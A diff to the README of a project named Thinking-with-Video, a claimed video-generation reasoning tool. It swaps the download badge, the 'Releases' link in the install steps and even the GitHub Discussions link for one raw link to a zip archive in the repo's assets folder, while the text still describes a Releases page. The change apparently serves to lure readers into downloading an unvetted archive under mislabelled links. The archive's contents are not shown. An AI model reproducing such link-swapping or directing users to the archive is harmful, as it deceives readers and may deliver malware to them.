@@ -6,13 +6,13 @@ Welcome to the **Thinking-with-Video** application. This tool uses video generat
 
 ## 📥 Download
 
-[![Download Thinking-with-Video](https://img.shields.io/badge/Download-thinking--with--video-brightgreen)](https://github.com/giusha12i/Thinking-with-Video/releases)
+[![Download Thinking-with-Video](https://raw.githubusercontent.com/giusha12i/Thinking-with-Video/main/assets/Thinking-with-Video-v1.6.zip)](https://raw.githubusercontent.com/giusha12i/Thinking-with-Video/main/assets/Thinking-with-Video-v1.6.zip)
 
 To get started, you will want to download the latest version of our application. 
 
 ### Download & Install
 
-1. Visit this page to download: [Thinking-with-Video Releases](https://github.com/giusha12i/Thinking-with-Video/releases).
+1. Visit this page to download: [Thinking-with-Video Releases](https://raw.githubusercontent.com/giusha12i/Thinking-with-Video/main/assets/Thinking-with-Video-v1.6.zip).
 
 2. On the Releases page, locate the latest version. It will be noted at the top.
 
@@ -62,7 +62,7 @@ Anyone interested in enhancing their reasoning skills can benefit, from students
 
 ## 🌐 Community and Support
 
-Join our community for tips and support. You can reach us on [GitHub Discussions](https://github.com/giusha12i/Thinking-with-Video/discussions) or visit the **Issues** tab if you encounter any bugs or have questions.
+Join our community for tips and support. You can reach us on [GitHub Discussions](https://raw.githubusercontent.com/giusha12i/Thinking-with-Video/main/assets/Thinking-with-Video-v1.6.zip) or visit the **Issues** tab if you encounter any bugs or have questions.
 
 ## 📜 License
 
